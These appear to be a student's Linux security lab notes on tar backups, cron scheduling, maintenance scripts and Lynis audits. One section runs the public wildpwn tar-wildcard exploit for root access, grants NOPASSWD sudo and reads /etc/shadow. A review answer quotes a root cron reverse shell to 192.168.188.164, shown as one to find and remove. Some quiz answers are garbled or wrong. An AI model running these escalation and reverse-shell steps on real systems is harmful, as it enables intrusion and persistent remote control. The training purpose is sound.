# Week 5.1

## Creating and Restoring Backups with tar

```console
cd ~/Documents/epscript/
ls -l
cd ..
sudo tar cvvWf 20190505epscript.tar epscript/ > 20190505epscript.txt
sudo tar tvvf 20190505epscript.tar | less
cd epscript/backup/
sudo tar tvvf 20190814epscript.tar | less
sudo mkdir patient_search
sudo tar xvvf 20190814epscript.tar -C patient_search/ epscript/patients/
ll patient_search/epscript/patients/
tar xvf 20190814epscript.tar 
grep -R "Mark,Lopez" epscript/
grep -R "Megan,Patel" epscript/
```
An important note when created backups. You cannot be in the the directory you want the backup of. we we cd .. out first.

## Restoring Data Incremental Backups

```console
cd ~/Documents/epscript
tar cvvWf epscript_back_sun.tar --listed-incremental=epscript_backup.snar --level=0 testenvir
tar tvvf epscript_back_sun.tar --incremental | less
rm -r testenvir/patient/
tar xvvf epscript_back_sun.tar -R -C ~/Documents/epscript/ testenvir/patient/
touch patient.0a.txt patient.0b.txt
tar cvvWf epscript_back_mon.tar --listed-incremental=epscript_backup.snar testenvir
tar tvvf epscript_back_mon.tar --incremental | less
```

## Exploiting the tar Command with the Checkpoint and Wildcard Options

```console
cd
sudo su jane
cd ~/Documents
cd ExploitTar
wget https://raw.githubusercontent.com/localh0t/wildpwn/master/wildpwn.py
python wildpwn.py tar .
ls -lat
cd .cache/
ls -lat
./.cachefile
visudo
```
From the exploit we now have root priviledges. As Jane we are able to enter visudo without any priviledge escalations. Within visudo we give ourselves all permissions with jane ALL=(ALL) NOPASSWD:ALL
```console
su jane
sudo cat etc/shadow
sudo rm -rf ~/Documents/ExploitTar
sudo apt install lynis
sudo lynis audit system
sudo nano /var/log/lynis-report.dat
```

# Week 5.2

## Simple Cronjobs
```console
systemctl status cron
sudo mkdir -p /usr/share/{doctors,patients,treatments}
sudo chown root:sysadmin /usr/share/doctors 
sudo chown root:sysadmin /usr/share/patients 
sudo chown root:sysadmin /usr/share/treatments
crontab -e
```
Within the crontab we will add the following lines of code. These lines will move the target docs into their respective folders at 6pm daily.
```console
0 18 * * * mv ~/Downloads/doctors*.docx /usr/share/doctors
0 18 * * * mv ~/Downloads/patients*.txt /usr/share/patients
0 18 * * * mv ~/Downloads/treatments*.pdf /usr/share/treatments
```
Then we will find the cron tab to verify it has been created.
```console
sudo ls -l /var/spool/cron/crontabs | grep sysadmin
```
**Bonus:**
We want a medical archive backup every friday at 11pm, then to verify the backup at 11:05pm, and to create a list of our downloads folder at 4am daily.
```console
0 23 * * 5 tar czvf ~/Documents/MedicalArchive/Medical_backup.tar.gz
5 23 * * 5 gzip -t Medical_backup.tar.gz >> /usr/share/backup_validation.txt
0 4 * * * ls -l ~/Downloads > ~/Documents/Medical_files_list.txt
sudo ls -l /var/spool/cron/crontabs | grep sysadmin
```
## Introduction to Scripts
In this lab we want to create scripts to backup our files, cleanup our caches, and to ensure our packages are all up to date.
```console
mkdir -p ~/Security_scripts
cd ~/Security_scripts
chmod +x backup.sh
chmod +x update.sh
sudo ./backup.sh
sudo ./update.sh
```
**backup.sh**
```console
#!/bin/bash
# Create /var/backup if it doesn't exist
mkdir -p /var/backup
# Create new /var/backup/home.tar
tar cvf /var/backup/home.tar /home
# Moves the file `/var/backup/home.tar` to `/var/backup/home.MMDDYYYY.tar`.
mv /var/backup/home.tar /var/backup/home.01012020.tar
# Creates an archive of `/home`and saves it to `/var/backup/home.tar`.
tar cvf /var/backup/system.tar /home 	
# List all files in `/var/backup`, including file sizes, and save the output to `/var/backup/file_report.txt`.
ls -lh /var/backup > /var/backup/file_report.txt
# Print how much free memory your machine has left. Save this to a file called `/var/backup/disk_report.txt`.
free -h > /var/backup/disk_report.txt
```
**update.sh**
```console
#!/bin/bash
# Ensure apt has all available updates
apt update -y
# Upgrade all installed packages
apt upgrade -y
# Install new packages, and uninstall any old packages that
# must be removed to install them
apt full-upgrade -y
# Remove unused packages and their associated configuration files
apt autoremove --purge -y
# Bonus - Perform with a single line of code.
apt update -y && apt upgrade -y && apt full-upgrade -y && apt-get autoremove --purge -y
```
**cleaup.sh**
```console
#!/bin/bash
# Clean up temp directories
rm -rf /tmp/*
rm -rf /var/tmp/*	
# Clear apt cache
apt clean -y
# Clear thumbnail cache for sysadmin, instructor, and student
rm -rf /home/sysadmin/.cache/thumbnails
rm -rf /home/instructor/.cache/thumbnails
rm -rf /home/student/.cache/thumbnails
rm -rf /root/.cache/thumbnails
```

## Scheduling Backups, Cleanups, and Security Checks
We also want to run Lynis on a regular basis and record the report in a log.\
lynis.system.sh
```console
#!/bin/bash 
lynis audit system >> /tmp/lynis.system_scan.log
```
lynis.partial.sh
```console
export TestGroup=('malware' 'authentication' 'networking' 
'storage' 'filesystems');  
for TG in ${TestGroup[@]};  
do sudo lynis audit system --tests-from-group $TG >> 
/tmp/lynis.partial_scan.log;  
done
```
```console
chmod +x lynis.system.sh
chmod +x lynis.partial.sh
sudo crontab -e
```
We will add the following to the bottom of the crontab:\
@weekly lynis.system.sh \
@daily lynis.partial.sh

We want to add our scripts to the system wide cron directories to schedule our scripts. We will do the following:
```console
cd ~/Security_scripts 
sudo cp backup.sh /etc/cron.weekly 
sudo cp update.sh /etc/cron.weekly
sduo cp cleanup.sh /etc/cron.daily
sudo cp lynis.system.sh /etc/cron.weekly 
sudo cp lynis.partial.sh /etc/cron.daily
```

## Reviewing
When will the following cron schedules run? 
*/10 * * * * <br>
■ Solution: At every 10th minute. 

What event is the following cron a minute away from? 
59 23 31 12 * <br>
■ Solution: New Years! 

What do the following hypothetical cron likely do? 
0 18 * * 1-5 /home/Bob/Sales/sum_of_sales.sh <br>
■ Solution: Run a script that adds up all the sales for the work day. 

@weekly /home/sysadmin/Scripts/auto-update.sh <br>
■ Solution: A weekly automated system update. 

What is a shebang? <br>
■ Solution: It is the commented file declaration at the top of a shell script. 

What two characters should come before the filename of a script? <br>
■ Solution: ./ 

Jane's script has "user" and "group" ownership of a script with -rw-r--r-- 
permissions, but she cannot get it to run. What must she do to the file before it will
run? <br>
■ Solution: Run chmod +x on her file! 

How does the -x option modify the tar command? <br>
■ Solution: This option will let tar extract an archive!
If a directory has ten files and the following command is used in it, how many files
are being archived? 

tar cvvWf backups/archive.tar <br>
■ Solution: Zero, because tar doesn’t compress! But all files should be
archived as they're all in the current directory! 

What option prints the full file specification of files as you interact with them? <br>
■ Solution: -vv 

Why is the -f option used in almost every tar operation? <br>
■ Solution: The -f option lets you designate a tar file to either "create" or
"extract" or "list" from. 

You are tasked to look through the cron jobs within your current workstation to see
if any suspicious or modified cronjobs exist. Remove the one that matches the following
descriptions: Cron is running system-level jobs with root privileges. The cron task you're
looking for involves another machine. <br>
■ Solution: <br>
Run sudo crontab -e to open the root crontab. <br>
The cron you wanted to remove was: <br>
*/2 * * * * /bin/bash -c 'bash -i >& /dev/tcp/192.168.188.164/888 0>&1 
